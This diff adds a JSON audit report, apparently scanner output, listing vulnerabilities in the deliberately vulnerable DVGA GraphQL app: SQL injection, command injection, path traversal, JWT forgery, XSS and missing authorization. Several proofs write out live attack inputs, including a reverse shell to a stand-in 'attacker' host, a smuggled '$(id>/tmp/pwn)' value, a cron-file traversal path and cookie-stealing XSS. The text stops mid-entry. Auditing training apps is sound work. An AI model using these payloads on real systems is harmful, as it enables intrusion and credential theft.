@@ -1,0 +1,1412 @@
+{
+  "version": "twin-distill-flash-r4",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "core/views.py",
+      "start": {
+        "line": 319
+      },
+      "end": {
+        "line": 319
+      },
+      "extra": {
+        "message": "SQL Injection in resolve_pastes via filter parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "result = result.filter(text(\"title = '%s' or content = '%s'\" % (filter, filter)))",
+          "proof": "SOURCE: The GraphQL query argument 'filter' (declared at line 313 as filter=graphene.String()) arrives unsanitized into resolve_pastes. SINK: On line 319, the filter value is injected via Python %-formatting directly into a raw SQL string passed to sqlalchemy.text(), which executes it verbatim against SQLite. An attacker can send filter=' OR 1=1 -- to dump all pastes, or use UNION-based injection to extract data from other tables (users, audits). No escaping, parameterization, or sanitization is applied."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "core/views.py",
+      "start": {
+        "line": 359
+      },
+      "end": {
+        "line": 359
+      },
+      "extra": {
+        "message": "OS Command Injection in resolve_system_diagnostics",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "output = helpers.run_cmd(cmd)",
+          "proof": "SOURCE: The GraphQL query argument 'cmd' (default 'whoami') is fully user-controlled and declared at line 351. SINK: On line 359, it is passed to helpers.run_cmd() which calls os.popen(cmd).read() (helpers.py line 9). In Beginner mode (the default), security.allowed_cmds() at security.py line 33 returns True unconditionally. An attacker sends { systemDiagnostics(username:\"admin\", password:\"changeme\", cmd:\"id; nc attacker 4444 -e /bin/sh\") } for full remote command execution. The password check can be bypassed because the password is stored in plaintext and is extractable via the SQL injection at line 319."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "core/views.py",
+      "start": {
+        "line": 205
+      },
+      "end": {
+        "line": 205
+      },
+      "extra": {
+        "message": "OS Command Injection via ImportPaste SSRF",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "cmd = helpers.run_cmd(f'curl --insecure {url}')",
+          "proof": "SOURCE: GraphQL mutation arguments 'scheme', 'host', 'port', 'path' are all user-controlled (lines 198-201). These are concatenated into a URL string at line 204. SINK: On line 205, the URL is interpolated into a curl command string passed to os.popen() via helpers.run_cmd(). In Beginner mode, security.strip_dangerous_characters() is a no-op (security.py line 40). An attacker can inject shell metacharacters via any of the four fields \u2014 e.g., scheme=\"http\", host=\"example.com\", port=\"80\", path=\"/$(id>/tmp/pwn)\" \u2014 achieving command execution through the shell-invoked curl command."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "core/helpers.py",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "Path Traversal in save_file via filename parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "f = open(WEB_UPLOADDIR + filename, 'w')",
+          "proof": "SOURCE: The mutation UploadPaste accepts a user-controlled 'filename' argument (core/views.py line 186) and passes it directly to helpers.save_file() at line 191. SINK: On helpers.py line 25, filename is concatenated with WEB_UPLOADDIR ('pastes/') without any sanitization or path validation. An attacker can set filename to '../../etc/cron.d/evil' to write arbitrary files anywhere the application has write access, achieving arbitrary file write and potentially remote code execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app.py",
+      "start": {
+        "line": 15
+      },
+      "end": {
+        "line": 15
+      },
+      "extra": {
+        "message": "Hardcoded JWT Secret Key",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "app.config[\"JWT_SECRET_KEY\"] = 'dvga'",
+          "proof": "SOURCE: On app.py line 15, the JWT signing key is hardcoded to the literal string 'dvga'. This overrides any secure key generation. SINK: flask_graphql_auth uses this key to sign and verify all JWT access and refresh tokens (create_access_token/create_refresh_token at views.py lines 243-244). An attacker who knows this key can forge arbitrary JWTs with any identity payload (e.g., 'admin'), gaining authentication as any user and accessing the resolve_password field on UserObject which returns the password when info.context.json.get('identity') == 'admin' (views.py lines 63-66)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-347",
+      "path": "core/helpers.py",
+      "start": {
+        "line": 21
+      },
+      "end": {
+        "line": 21
+      },
+      "extra": {
+        "message": "JWT Signature Verification Disabled",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-347"
+          ],
+          "citation": "return decode(token, options={\"verify_signature\":False, \"verify_exp\":False}).get('identity')",
+          "proof": "SOURCE: The resolve_me resolver (core/views.py line 303) receives a user-controlled 'token' argument and passes it to get_identity() at helpers.py line 20. SINK: On helpers.py line 21, jwt.decode() is called with options={\"verify_signature\":False, \"verify_exp\":False}, meaning NO signature verification and NO expiration check is performed. An attacker can craft an arbitrary JWT with payload {\"identity\":\"admin\"}, sign it with any random string (or even an empty string), and send it to the me query. The server will accept it, set info.context.json['identity'] = 'admin', and then the resolve_password method (views.py lines 62-66) will return the actual password for any user because the identity check passes."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "templates/paste.html",
+      "start": {
+        "line": 75
+      },
+      "end": {
+        "line": 75
+      },
+      "extra": {
+        "message": "Stored DOM-based XSS via paste content (WebSocket subscription)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<pre>${paste.content}</pre>",
+          "proof": "SOURCE: User-controlled paste content is stored in the database by CreatePaste mutation (views.py lines 127-128). It is then delivered to all connected WebSocket clients via the subscription resolver (views.py line 258). SINK: On paste.html line 75, the paste content is interpolated into a JavaScript template literal as ${paste.content} and injected into the DOM via jQuery's .prependTo() (line 84), which parses the string as HTML. An attacker creates a paste with content containing <img src=x onerror=alert(document.cookie)> or similar HTML/JS. When any victim views a page with the WebSocket subscription active, the payload executes in their browser context. No sanitization is applied server-side or client-side."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "templates/paste.html",
+      "start": {
+        "line": 140
+      },
+      "end": {
+        "line": 140
+      },
+      "extra": {
+        "message": "Stored DOM-based XSS via paste content (GET pastes query)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<pre>${content}</pre>",
+          "proof": "SOURCE: User-controlled paste content stored by CreatePaste (views.py lines 127-128) is retrieved by the getPastes GraphQL query. SINK: On paste.html line 140, the paste content is interpolated as ${content} into a JavaScript template literal and injected into the DOM via jQuery's .append() (lines 138 and 149), which interprets the string as HTML. An attacker creates a paste with <svg onload=alert(1)> and any user visiting /public_pastes or /my_pastes will execute the script. Additionally, the userAgent field (rendered as ${uas} at lines 142 and 154) is also user-controlled through the User-Agent HTTP header (views.py line 133) and can be used as an alternative injection vector."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-256",
+      "path": "core/views.py",
+      "start": {
+        "line": 234
+      },
+      "end": {
+        "line": 234
+      },
+      "extra": {
+        "message": "Plaintext password storage and comparison enables credential theft",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-256"
+          ],
+          "citation": "user = User.query.filter_by(username=username, password=password).first()",
+          "proof": "Passwords are stored in plaintext in the users table (models.py line 14: password = db.Column(db.String(60))) and compared directly in the login query without hashing - no bcrypt, scrypt, or any password hashing is applied (views.py line 234). The create_user method (models.py) stores the password verbatim. Combined with the SQL injection at line 319, an attacker can extract all plaintext passwords from the database. The admin password from resolve_system_diagnostics (line 353: real_passw = q.password) also retrieves plaintext for comparison at security.py line 54: if password == real_password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/views.py",
+      "start": {
+        "line": 64
+      },
+      "end": {
+        "line": 64
+      },
+      "extra": {
+        "message": "Sensitive information exposure via resolve_password",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "return self.password",
+          "proof": "UserObject.resolve_password (line 62) returns the plaintext password when info.context.json.get('identity') == 'admin' (line 63-64). Because get_identity (helpers.py line 21) does not verify the JWT signature (CWE-347), an attacker can forge an admin identity, query the users field, and retrieve every stored password via the password field on UserObject."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "core/views.py",
+      "start": {
+        "line": 148
+      },
+      "end": {
+        "line": 148
+      },
+      "extra": {
+        "message": "IDOR in EditPaste mutation - missing authorization check",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "Paste.query.filter_by(id=id).update(dict(title=title, content=content))",
+          "proof": "The EditPaste mutation (line 140) accepts a user-supplied 'id' argument and updates any paste identified by that id without checking ownership, authentication, or authorization. An attacker can modify other users' private pastes by simply iterating paste ids. No token or session check is performed before the update at line 148."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "core/views.py",
+      "start": {
+        "line": 167
+      },
+      "end": {
+        "line": 167
+      },
+      "extra": {
+        "message": "IDOR in DeletePaste mutation",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if Paste.query.filter_by(id=id).delete():",
+          "proof": "The DeletePaste.mutate accepts a user-supplied 'id' GraphQL argument and deletes the matching paste directly via SQLAlchemy without any authentication or ownership check. An unauthenticated attacker can delete any paste by guessing or enumerating IDs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "core/views.py",
+      "start": {
+        "line": 387
+      },
+      "end": {
+        "line": 387
+      },
+      "extra": {
+        "message": "Missing authorization on delete_all_pastes",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "Paste.query.delete()",
+          "proof": "The resolve_delete_all_pastes function executes Paste.query.delete() which deletes every row in the pastes table. The query is exposed via GraphQL as deleteAllPastes with no authentication, authorization, or rate limiting."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-918",
+      "path": "core/views.py",
+      "start": {
+        "line": 211
+      },
+      "end": {
+        "line": 211
+      },
+      "extra": {
+        "message": "Server-side request forgery in ImportPaste",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-918"
+          ],
+          "citation": "cmd = helpers.run_cmd(f'curl --insecure {url}')",
+          "proof": "User-controlled scheme, host, port, and path are concatenated into a URL, then passed to curl via helpers.run_cmd (os.popen). strip_dangerous_characters only removes ';' and '&' in hard mode and does nothing in easy mode, so file://, http://localhost, or internal IP schemes bypass sanitization. An attacker can target internal services or read local files."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-209",
+      "path": "core/view_override.py",
+      "start": {
+        "line": 53
+      },
+      "end": {
+        "line": 53
+      },
+      "extra": {
+        "message": "Information disclosure through GraphQL error responses",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-209"
+          ],
+          "citation": "formatted_error['extensions']['exception']['stack'] = traceback.format_stack(frame)\n            formatted_error['extensions']['exception']['debug'] = traceback.format_exc()\n            formatted_error['extensions']['exception']['path'] = caller_filename_full",
+          "proof": "format_custom_error attaches full Python stack traces, exception debug strings, and the caller file path to every GraphQL error response (except GraphiQL Access Rejected). An attacker can trigger any error to receive detailed internal path and code structure information."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 387
+      },
+      "end": {
+        "line": 387
+      },
+      "extra": {
+        "message": "Missing Authorization on deleteAllPastes query",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "Paste.query.delete()\n    db.session.commit()\n    return Paste.query.count() == 0",
+          "proof": "GraphQL query deleteAllPastes calls resolve_delete_all_pastes which executes Paste.query.delete() with no authentication or authorization check. Any unauthenticated user can destroy ALL paste data with a single query."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 357
+      },
+      "end": {
+        "line": 357
+      },
+      "extra": {
+        "message": "Missing Authorization on readAndBurn query",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_read_and_burn(self, info, id):\n    result = Paste.query.filter_by(id=id, burn=True).first()\n    Paste.query.filter_by(id=id, burn=True).delete()",
+          "proof": "GraphQL query readAndBurn accepts user-supplied 'id', reads the paste content, and deletes it permanently. No authentication or ownership check exists. An attacker can read and destroy any burn-after-read paste by guessing or enumerating IDs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 148
+      },
+      "end": {
+        "line": 148
+      },
+      "extra": {
+        "message": "Missing Authorization on EditPaste mutation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "Paste.query.filter_by(id=id).update(dict(title=title, content=content))",
+          "proof": "GraphQL mutation editPaste(id, title, content) accepts user-supplied 'id', 'title', and 'content' and updates any paste by ID directly in the database. No authentication or ownership check. Any unauthenticated attacker can modify any paste's title and content."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 370
+      },
+      "end": {
+        "line": 370
+      },
+      "extra": {
+        "message": "Missing Authorization on users query exposes passwords",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_users(self, info, id=None):\n    query = UserObject.get_query(info)\n    ...\n    return result",
+          "proof": "GraphQL query 'users { id username password }' calls resolve_users which returns User objects. UserObject.resolve_password (line 62) returns self.password when info.context.json.get('identity') == 'admin'. Since resolve_me (line 297) sets context.json['identity'] from a JWT decoded without signature verification (helpers.py:21), an attacker can forge a JWT with 'identity': 'admin', call me(token: '<forged>'), then query users { password } to retrieve ALL passwords in plaintext."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/view_override.py",
+      "start": {
+        "line": 53
+      },
+      "end": {
+        "line": 53
+      },
+      "extra": {
+        "message": "Full Stack Trace Information Exposure in GraphQL Error Responses",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "formatted_error['extensions']['exception']['stack'] = traceback.format_stack(frame)\n            formatted_error['extensions']['exception']['debug'] = traceback.format_exc()\n            formatted_error['extensions']['exception']['path'] = caller_filename_full",
+          "proof": "format_custom_error attaches full Python stack traces, exception traceback, and caller file path to every GraphQL error response. An attacker can intentionally trigger errors (invalid queries, type mismatches, auth failures) to receive detailed internal path and code structure information useful for reconnaissance."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "core/views.py",
+      "start": {
+        "line": 62
+      },
+      "end": {
+        "line": 62
+      },
+      "extra": {
+        "message": "Authorization Bypass via User-Controlled Identity Key in resolve_password",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if info.context.json.get('identity') == 'admin':\n      return self.password",
+          "proof": "UserObject.resolve_password checks info.context.json.get('identity') to decide whether to return cleartext passwords. Since JWT signature verification is disabled (helpers.py:21), an attacker can forge a JWT with 'identity': 'admin', call me(token: '<forged>') to set info.context.json['identity'] = 'admin' (line 299), then query users { password } to retrieve all user passwords in plaintext."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-256",
+      "path": "core/models.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "Plaintext Password Storage in User Model",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-256"
+          ],
+          "citation": "password = db.Column(db.String(60),nullable=False)",
+          "proof": "The User.password column is a plain String(60) with no hashing, salting, or key derivation. The CreateUser mutation at core/views.py passes the password verbatim to User.create_user(), and the Login mutation compares it directly via filter_by(username=username, password=password). Untrusted SOURCE: user-supplied password input via CreateUser/Login mutations -> SINK: plaintext storage in SQLite database. Any SQL injection, authorization bypass, or direct DB access leaks all user passwords in cleartext."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 262
+      },
+      "end": {
+        "line": 262
+      },
+      "extra": {
+        "message": "Missing Authorization on WebSocket Subscription Leaks Private Paste Content",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_paste(self, info):\n    return global_event.map(lambda i: i)",
+          "proof": "The paste subscription resolver returns global_event.map(lambda i: i), which broadcasts every newly inserted Paste object (including private and burn-on-read pastes) to all WebSocket subscribers via the after_insert listener. There is no authentication, ownership check, or public/private visibility filter. The /subscriptions WebSocket route at line 461 has no access control either. Untrusted SOURCE: unauthenticated WebSocket connection -> SINK: unauthorized real-time data broadcast of all paste content, including private pastes."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "setup.py",
+      "start": {
+        "line": 64
+      },
+      "end": {
+        "line": 64
+      },
+      "extra": {
+        "message": "Hardcoded Weak Password for Operator User",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "operator = User(username=\"operator\", email=\"operator@blackhatgraphql.com\", password=\"password123\")",
+          "proof": "The setup.py initialization script creates an 'operator' user with the hardcoded weak password 'password123'. This password is stored in plaintext (CWE-256) in the database. Anyone with source code access or who discovers this credential can authenticate as the 'operator' user and access all operator-level functionality. Untrusted SOURCE: hardcoded literal in source code -> SINK: operator account with known credentials in production database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1188",
+      "path": "core/views.py",
+      "start": {
+        "line": 471
+      },
+      "end": {
+        "line": 471
+      },
+      "extra": {
+        "message": "Global Security Mode Downgrade via Unauthenticated HTTP Header",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-1188"
+          ],
+          "citation": "mode_header = request.headers.get('X-DVGA-MODE', None)\n  if mode_header:\n    if mode_header == 'Expert':\n      helpers.set_mode('hard')\n    else:\n      helpers.set_mode('easy')",
+          "proof": "The @app.before_request set_difficulty hook at line 470 toggles the server-wide security mode based on the client-supplied X-DVGA-MODE HTTP header. Any unauthenticated client sending X-DVGA-MODE: Beginner (or any value other than 'Expert') sets the global ServerMode to 'easy', which disables all GraphQL security middleware (DepthProtection, CostProtection, Introspection, DenyList, OpNameProtection) for all subsequent requests from all users. Untrusted SOURCE: unauthenticated X-DVGA-MODE HTTP header -> SINK: global security control bypass via helpers.set_mode('easy')."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1004",
+      "path": "core/views.py",
+      "start": {
+        "line": 395
+      },
+      "end": {
+        "line": 395
+      },
+      "extra": {
+        "message": "Insecure Cookie Setting for GraphiQL Protection Bypass",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1004"
+          ],
+          "citation": "resp.set_cookie(\"env\", \"graphiql:disable\")",
+          "proof": "The 'env' cookie controlling GraphiQL access is set without HttpOnly, Secure, or SameSite flags. The cookie value 'graphiql:disable' can be trivially changed by client-side JavaScript (document.cookie = \"env=graphiql:enable\") or by the client manually. This bypasses the IGQLProtectionMiddleware which presumably checks this cookie. Untrusted SOURCE: client-modifiable cookie via JavaScript or direct header manipulation -> SINK: GraphiQL interface access control bypass."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "core/views.py",
+      "start": {
+        "line": 358
+      },
+      "end": {
+        "line": 358
+      },
+      "extra": {
+        "message": "IDOR in read_and_burn query",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "result = Paste.query.filter_by(id=id, burn=True).first()",
+          "proof": "The resolve_read_and_burn resolver takes an attacker-supplied 'id' parameter, fetches the burn paste by that ID, then deletes it, with no ownership or authorization check. Any authenticated user can read and destroy any other user's burn-on-read paste by guessing or enumerating IDs. Untrusted SOURCE: user-supplied 'id' integer parameter -> SINK: Paste.query.filter_by(id=id, burn=True) without ownership verification."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "core/views.py",
+      "start": {
+        "line": 328
+      },
+      "end": {
+        "line": 328
+      },
+      "extra": {
+        "message": "IDOR in resolve_paste via title",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "return query.filter_by(title=title, burn=False).first()",
+          "proof": "The resolve_paste resolver accepts an attacker-supplied 'title' argument and queries for any paste with that title. The only filter applied is burn=False; there is no check on the public flag or paste ownership. This allows an attacker to retrieve any non-burn paste (including private pastes) by its title. Untrusted SOURCE: user-supplied 'title' string parameter -> SINK: query.filter_by(title=title, burn=False) without ownership or public-flag checks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/views.py",
+      "start": {
+        "line": 303
+      },
+      "end": {
+        "line": 303
+      },
+      "extra": {
+        "message": "Private paste and user disclosure via search",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "queryset1 = Paste.query.filter(Paste.title.like(search))",
+          "proof": "The resolve_search resolver performs a SQL LIKE search across ALL pastes (Paste.query.filter(Paste.title.like(search))) and ALL users without filtering on the public flag or ownership. When no keyword is provided, ALL pastes and ALL users are returned. This exposes private paste titles to any unauthenticated client. Untrusted SOURCE: user-supplied keyword parameter -> SINK: Paste.query without public or owner filter."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/views.py",
+      "start": {
+        "line": 381
+      },
+      "end": {
+        "line": 381
+      },
+      "extra": {
+        "message": "Unauthenticated audit log disclosure",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "query = Audit.query.all()",
+          "proof": "The resolve_audits resolver returns every audit log entry (Audit.query.all()) without any authentication or authorization check. Audit entries store raw GraphQL queries which may contain credentials, tokens, or other sensitive data. The clean_query regex redaction (core/models.py lines 24-25) of passwords and tokens is easily bypassed with different quoting or formatting. Untrusted SOURCE: unauthenticated GraphQL query to the audits field -> SINK: Audit.query.all() returning all audit records."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "core/views.py",
+      "start": {
+        "line": 434
+      },
+      "end": {
+        "line": 434
+      },
+      "extra": {
+        "message": "Missing authorization on start_over destructive route",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "res = helpers.initialize()",
+          "proof": "The GET /start_over route (line 431) calls helpers.initialize() which runs 'python3 setup.py' via os.popen() (deleting and recreating the database and upload directory). There is no authentication or authorization check on this route. Any unauthenticated attacker can destroy all application data by visiting this URL. Untrusted SOURCE: unauthenticated HTTP GET request -> SINK: helpers.initialize() -> complete database/data destruction."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "core/views.py",
+      "start": {
+        "line": 449
+      },
+      "end": {
+        "line": 449
+      },
+      "extra": {
+        "message": "Missing authorization on difficulty route",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "helpers.set_mode(level)",
+          "proof": "The GET /difficulty/<level> route (line 446) toggles the global game security mode to easy or hard with no authentication. Calling /difficulty/easy sets the ServerMode to 'easy', which disables all GraphQL security middleware (DepthProtection, CostProtection, DenyList, OpNameProtection, Introspection). Any unauthenticated client can bypass all security controls. Untrusted SOURCE: unauthenticated HTTP GET request with attacker-chosen level -> SINK: helpers.set_mode(level) disabling security middleware."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "core/views.py",
+      "start": {
+        "line": 431
+      },
+      "end": {
+        "line": 431
+      },
+      "extra": {
+        "message": "Missing Authentication and CSRF on /start_over Destructive GET Route",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "@app.route('/start_over')\ndef start_over():\n  msg = \"Restored to default state.\"\n  res = helpers.initialize()",
+          "proof": "The /start_over route is a GET endpoint with no authentication that calls helpers.initialize(), which runs 'python3 setup.py' through os.popen(), deleting the entire database and recreating it. Since this is a GET endpoint, an attacker can trigger it cross-origin via an <img> tag (GET-based CSRF), a <script> tag, or a direct link, causing destructive denial-of-service and permanent data loss on any active user's session. Untrusted SOURCE: cross-origin GET request from arbitrary website -> SINK: helpers.initialize() deleting and recreating the entire database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 424
+      },
+      "end": {
+        "line": 424
+      },
+      "extra": {
+        "message": "Missing Authentication on /audit Route Exposes All GraphQL Query Logs",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "audit = Audit.query.order_by(Audit.timestamp.desc())\nreturn render_template(\"audit.html\", audit=audit)",
+          "proof": "The /audit web route has no authentication decorator or authorization check. Audit.query returns all Audit records containing every GraphQL query and mutation executed on the system. An unauthenticated attacker can browse /audit to learn the attack surface and discover private data queries."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "core/views.py",
+      "start": {
+        "line": 224
+      },
+      "end": {
+        "line": 224
+      },
+      "extra": {
+        "message": "No Rate Limiting on Login Mutation Enables Brute-Force Attack",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def mutate(self, info , username, password) :\n    user = User.query.filter_by(username=username, password=password).first()",
+          "proof": "The Login mutation has no rate limiting, account lockout, CAPTCHA, or exponential backoff. Combined with plaintext password storage (setup.py:53), an attacker can send unlimited authentication requests per second to brute-force credentials for any user account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 330
+      },
+      "end": {
+        "line": 330
+      },
+      "extra": {
+        "message": "Missing Authorization on resolve_system_update Enables Unauthenticated CPU Exhaustion DoS",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_system_update(self, info):\n    security.simulate_load()\n    Audit.create_audit_entry(info)\n    return 'no updates available'",
+          "proof": "The resolve_system_update resolver is callable by anyone with no authentication. It invokes security.simulate_load() which performs a CPU-intensive busy-wait loop with random sleep durations up to ~50 seconds. An attacker can call this repeatedly to exhaust CPU resources, causing a denial of service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-295",
+      "path": "core/views.py",
+      "start": {
+        "line": 207
+      },
+      "end": {
+        "line": 207
+      },
+      "extra": {
+        "message": "SSL/TLS Certificate Validation Disabled in ImportPaste curl Command",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-295"
+          ],
+          "citation": "cmd = helpers.run_cmd(f'curl --insecure {url}')",
+          "proof": "The ImportPaste mutation constructs a curl command with the --insecure flag, which disables SSL/TLS certificate validation. A man-in-the-middle attacker on the network can intercept the HTTP request, present a forged certificate, and inject arbitrary content into the application or read sensitive data from the response."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 310
+      },
+      "end": {
+        "line": 310
+      },
+      "extra": {
+        "message": "resolve_pastes Returns Private Pastes By Default with No Authorization Check",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_pastes(self, info, public=False, limit=1000, filter=None):\n    query = PasteObject.get_query(info)\n    result = query.filter_by(public=public, burn=False)",
+          "proof": "The resolve_pastes resolver defaults public=False, meaning it returns private pastes when no public argument is supplied. There is no authentication or ownership check. Any unauthenticated attacker can query { pastes { id title content owner ipAddr userAgent } } to retrieve ALL private paste content."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-183",
+      "path": "core/security.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "Missing Comma in allowed_cmds Tuple Renders Command Allowlist Ineffective",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-183"
+          ],
+          "citation": "if cmd.startswith(('echo', 'ps' 'whoami', 'tail')):",
+          "proof": "The tuple ('echo', 'ps' 'whoami', 'tail') is missing a comma between 'ps' and 'whoami'. Python implicit string concatenation at compile time turns this into ('echo', 'pswhoami', 'tail'). In hard mode, commands starting with legitimate 'ps' or 'whoami' are blocked, while commands starting with 'pswhoami' are incorrectly allowed, defeating the security control."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 297
+      },
+      "end": {
+        "line": 297
+      },
+      "extra": {
+        "message": "Missing Authorization on resolve_search Exposes All Users and Pastes Without Authentication",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def resolve_search(self, info, keyword=None):\n    ...\n    else:\n      queryset1 = Paste.query.all()\n      items.extend(queryset1)\n      queryset2 = User.query.all()\n      items.extend(queryset2)",
+          "proof": "When the keyword argument is omitted from resolve_search, the resolver returns ALL Paste records and ALL User records with no authentication check. An unauthenticated attacker can query { search { ... on UserObject { username } ... on PasteObject { id title content } } } to dump all user data and paste content from the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "setup.py",
+      "start": {
+        "line": 53
+      },
+      "end": {
+        "line": 53
+      },
+      "extra": {
+        "message": "Hardcoded Admin Password 'changeme' via random_password()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "def random_password():\n  weak_passwords = ['changeme']\n  return random.choice(weak_passwords)",
